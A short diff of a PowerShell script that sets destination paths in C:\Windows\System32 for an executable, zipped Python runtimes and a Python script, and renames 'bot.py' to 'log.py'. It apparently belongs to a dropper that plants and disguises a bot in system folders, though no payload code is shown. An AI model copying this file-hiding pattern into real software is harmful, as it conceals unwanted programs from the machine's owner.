@@ -1,5 +1,5 @@
 $destino = 'C:\Windows\System32\Int-service.exe'
-$destino2 = 'C:\Windows\System32\ap32\bot.py'
+$destino2 = 'C:\Windows\System32\ap32\log.py'
 $destino3 = 'C:\Windows\System32\re-as\WPy64.zip'
 $destino4 = 'C:\Windows\System32\re-as\WPy64_2.zip'
 $destino5 = 'C:\Windows\System32\ap32\scripts.zip'
@@ -52,4 +52,5 @@ if (Test-Path "C:\Windows\go.ps1") {
 }
 
 exit
+
 
